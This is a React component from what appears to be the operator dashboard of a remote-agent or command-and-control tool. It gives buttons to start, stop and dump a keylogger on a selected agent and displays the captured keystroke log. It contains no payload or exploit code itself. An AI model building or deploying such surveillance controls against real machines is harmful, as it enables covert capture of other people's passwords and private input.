"use client";

import { memo, useState } from "react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Spinner } from "@/components/ui/spinner";
import { Keyboard, Play, Square, Download } from "lucide-react";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import CollectCard from "./CollectCard";
import { useCollectTask } from "./useCollectTask";

interface KeyloggerSectionProps {
  agentId: string;
  online: boolean;
}

export default memo(function KeyloggerSection({ agentId, online }: KeyloggerSectionProps) {
  const { t } = useI18n();
  const { busy, result: log, collect } = useCollectTask(agentId);
  const [active, setActive] = useState<boolean | null>(null);

  const run = async (kind: "start" | "stop" | "dump") => {
    const path =
      kind === "start"
        ? paths.agents.keyloggerStart(agentId)
        : kind === "stop"
          ? paths.agents.keyloggerStop(agentId)
          : paths.agents.keyloggerDump(agentId);
    const out = await collect(kind, path, {
      emptyText: kind === "dump" ? t("agents.keylog_empty") : undefined,
      storeResult: kind === "dump",
      successText:
        kind === "start"
          ? t("agents.keylog_started")
          : kind === "stop"
            ? t("agents.keylog_stopped")
            : t("agents.keylog_dumped"),
      errorText: t("agents.keylog_failed"),
    });
    if (out === null) return;
    if (kind === "start") setActive(true);
    else if (kind === "stop") setActive(false);
  };

  return (
    <CollectCard
      title={t("agents.keylog_title")}
      icon={<Keyboard className="size-3.5" />}
      headerRight={
        <>
          {active !== null && (
            <Badge variant={active ? "success" : "secondary"} className="gap-1 text-xs">
              <span className={`size-1.5 rounded-full ${active ? "bg-success animate-pulse" : "bg-muted-foreground"}`} />
              {active ? t("agents.keylog_active") : t("agents.keylog_inactive")}
            </Badge>
          )}
          <Button size="sm" variant="outline" disabled={!online || busy !== null} onClick={() => void run("start")}>
            <Play className="size-4" /> {t("agents.keylog_start")}
          </Button>
          <Button size="sm" variant="outline" disabled={!online || busy !== null} onClick={() => void run("stop")}>
            <Square className="size-4" /> {t("agents.keylog_stop")}
          </Button>
          <Button size="sm" disabled={!online || busy !== null} onClick={() => void run("dump")}>
            {busy === "dump" ? (
              <>
                <Spinner size="xs" /> {t("agents.keylog_dumping")}
              </>
            ) : (
              <>
                <Download className="size-4" /> {t("agents.keylog_dump")}
              </>
            )}
          </Button>
        </>
      }
      emptyIcon={Keyboard}
      emptyTitle={t("agents.keylog_empty_title")}
      emptyHint={t("agents.keylog_empty_hint")}
      result={log}
      resultMaxHeight="max-h-64"
      footer={log !== null ? <p className="text-xs text-muted-foreground">{t("agents.keylog_drain_hint")}</p> : undefined}
    />
  );
});
